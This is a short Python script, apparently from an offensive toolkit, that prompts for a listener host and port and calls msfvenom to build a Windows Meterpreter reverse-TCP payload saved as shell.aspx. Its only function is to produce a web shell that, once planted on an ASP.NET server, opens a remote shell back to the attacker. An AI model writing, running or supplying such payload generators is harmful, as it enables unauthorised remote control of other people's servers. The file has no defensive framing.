import os
import sys
import subprocess
def clear():
    subprocess.call("clear")

def checkmsfvenom():
    os.system("bash /usr/share/xfeezer/exxer/generate/aspx/checkmsfvenom.sh")

class aspx():
    clear()
    checkmsfvenom()
    f = input("add lhost=>")
    print("lhost =>" + " " + f)
    r = input("add lport=>")
    print("lport => " + " " + r)
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + f + " " + "LPORT=" + r + " " + "-f aspx > shell.aspx")
if __name__ == '__main__':
    aspx()